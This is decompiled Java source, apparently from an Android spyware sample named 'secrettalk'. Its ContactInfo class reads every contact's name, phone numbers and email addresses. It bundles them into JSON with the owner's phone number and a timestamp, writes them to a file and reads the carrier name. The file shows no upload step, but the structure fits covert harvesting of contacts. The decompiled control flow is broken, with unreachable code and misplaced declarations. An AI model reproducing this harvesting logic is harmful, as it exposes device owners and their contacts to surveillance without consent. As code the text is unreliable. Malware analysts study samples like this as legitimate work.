package com.android.secrettalk;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.TelephonyManager;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.URLEncoder;
import java.util.ArrayList;

public class ContactInfo
{
  private static Context context;
  private static String strFileName = "contact.txt";
  
  private static void getContactData()
  {
    new ArrayList();
    for (;;)
    {
      try
      {
        localFileOutputStream = context.openFileOutput(strFileName, 0);
        Cursor localCursor1 = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (!localCursor1.moveToNext())
        {
          localCursor1.close();
          localFileOutputStream.close();
        }
        else
        {
          String str1 = localCursor1.getString(localCursor1.getColumnIndex("_id"));
          localFileOutputStream.write(("\r\n" + localCursor1.getString(localCursor1.getColumnIndex("display_name")) + ": ").getBytes());
          if (Integer.parseInt(localCursor1.getString(localCursor1.getColumnIndex("has_phone_number"))) == 1)
          {
            localCursor3 = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id='" + str1 + "'", null, null);
            if (!localCursor3.moveToNext()) {
              localCursor3.close();
            }
          }
          else
          {
            ContentResolver localContentResolver = context.getContentResolver();
            Uri localUri = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
            String[] arrayOfString = new String[2];
            arrayOfString[0] = "data1";
            arrayOfString[1] = "data2";
            localCursor2 = localContentResolver.query(localUri, arrayOfString, "contact_id='" + str1 + "'", null, null);
            if (localCursor2.moveToNext()) {
              continue;
            }
            localCursor2.close();
            continue;
          }
        }
      }
      catch (Exception localException)
      {
        FileOutputStream localFileOutputStream;
        Cursor localCursor3;
        Cursor localCursor2;
        localException.printStackTrace();
        break label575;
        String str3 = localCursor3.getString(localCursor3.getColumnIndex("data1"));
        String str4 = localCursor3.getString(localCursor3.getColumnIndex("data2"));
        Integer.parseInt(str4);
        localFileOutputStream.write(("phone number: " + str3 + "(" + str4 + ") ").getBytes());
        continue;
        String str2 = localCursor2.getString(localCursor2.getColumnIndex("data1"));
        switch (Integer.parseInt(localCursor2.getString(localCursor2.getColumnIndex("data2"))))
        {
        case 1: 
          localFileOutputStream.write(("Home: " + str2).getBytes());
          break;
        case 2: 
          localFileOutputStream.write(("Work: " + str2).getBytes());
          break;
        case 3: 
          localFileOutputStream.write(("Other: " + str2).getBytes());
          break;
        case 4: 
          localFileOutputStream.write(("Mobile: " + str2).getBytes());
          break;
        case 5: 
          localFileOutputStream.write(("Custom: " + str2).getBytes());
          continue;
        }
      }
      label575:
      return;
    }
  }
  
  public static JsonArray getContactInfo()
  {
    context = GlobalData.getInstance().getContext();
    JsonObject localJsonObject1 = new JsonObject();
    JsonArray localJsonArray = new JsonArray();
    new ArrayList();
    try
    {
      Cursor localCursor1 = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
      for (;;)
      {
        if (!localCursor1.moveToNext())
        {
          localCursor1.close();
          localJsonObject1.add("contacts", localJsonArray);
          return localJsonArray;
        }
        localJsonObject2 = new JsonObject();
        localJsonObject2.addProperty("my_pn", GlobalData.my_phonenumber);
        String str1 = localCursor1.getString(localCursor1.getColumnIndex("_id"));
        new StringBuilder("\r\n").append(localCursor1.getString(localCursor1.getColumnIndex("display_name"))).append(": ").toString();
        localJsonObject2.addProperty("name", URLEncoder.encode(localCursor1.getString(localCursor1.getColumnIndex("display_name"))));
        localJsonObject2.addProperty("udate", Long.valueOf(System.currentTimeMillis() / 1000L));
        if (Integer.parseInt(localCursor1.getString(localCursor1.getColumnIndex("has_phone_number"))) == 1)
        {
          localCursor3 = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id='" + str1 + "'", null, null);
          if (localCursor3.moveToNext()) {
            break;
          }
          localCursor3.close();
        }
        ContentResolver localContentResolver = context.getContentResolver();
        Uri localUri = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
        String[] arrayOfString = new String[2];
        arrayOfString[0] = "data1";
        arrayOfString[1] = "data2";
        localCursor2 = localContentResolver.query(localUri, arrayOfString, "contact_id='" + str1 + "'", null, null);
        if (localCursor2.moveToNext()) {
          break label683;
        }
        localJsonArray.add(localJsonObject2);
        localCursor2.close();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        JsonObject localJsonObject2;
        Cursor localCursor3;
        Cursor localCursor2;
        localException.printStackTrace();
        continue;
        String str3 = localCursor3.getString(localCursor3.getColumnIndex("data1"));
        String str4 = localCursor3.getString(localCursor3.getColumnIndex("data2"));
        switch (Integer.parseInt(str4))
        {
        case 4: 
        case 5: 
        case 6: 
        default: 
          new StringBuilder("phone number: ").append(str3).append("(").append(str4).append(") ").toString();
          localJsonObject2.addProperty("phone_num", str3 + "(" + str4 + ")");
          break;
        case 1: 
          new StringBuilder("Home: ").append(str3).toString();
          localJsonObject2.addProperty("home_pn", str3);
          break;
        case 3: 
          new StringBuilder("Work: ").append(str3).toString();
          localJsonObject2.addProperty("work_pn", str3);
          break;
        case 7: 
          new StringBuilder("Other: ").append(str3).toString();
          localJsonObject2.addProperty("other_pn", str3);
          break;
        case 2: 
          new StringBuilder("Mobile: ").append(str3).toString();
          localJsonObject2.addProperty("mobile_pn", str3);
          break;
        case 0: 
          new StringBuilder("Custom: ").append(str3).toString();
          localJsonObject2.addProperty("custom_pn", str3);
          continue;
          label683:
          String str2 = localCursor2.getString(localCursor2.getColumnIndex("data1"));
          switch (Integer.parseInt(localCursor2.getString(localCursor2.getColumnIndex("data2"))))
          {
          case 1: 
            new StringBuilder("Home: ").append(str2).toString();
            localJsonObject2.addProperty("home_mail", str2);
            break;
          case 2: 
            new StringBuilder("Work: ").append(str2).toString();
            localJsonObject2.addProperty("work_mail", str2);
            break;
          case 3: 
            new StringBuilder("Other: ").append(str2).toString();
            localJsonObject2.addProperty("other_mail", str2);
            break;
          case 4: 
            new StringBuilder("Mobile: ").append(str2).toString();
            localJsonObject2.addProperty("mobile_mail", str2);
            break;
          case 5: 
            new StringBuilder("Custom: ").append(str2).toString();
            localJsonObject2.addProperty("custom_mail", str2);
          }
          break;
        }
      }
    }
  }
  
  public static String getMyPhoneNumber()
  {
    return GlobalData.my_phonenumber;
  }
  
  public static String getOperator()
  {
    context = GlobalData.getInstance().getContext();
    return ((TelephonyManager)context.getSystemService("phone")).getNetworkOperatorName();
  }
  
  private static String get_contact_file(String paramString)
  {
    Object localObject = "";
    try
    {
      FileInputStream localFileInputStream = context.openFileInput(paramString);
      byte[] arrayOfByte = new byte[localFileInputStream.available()];
      localFileInputStream.read(arrayOfByte);
      localFileInputStream.close();
      String str = new String(arrayOfByte);
      localObject = str;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
    return localObject;
  }
}


/* Location:           D:\Workspaces\SsSDK\contest_dev\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.ContactInfo
 * JD-Core Version:    0.7.0.1
 */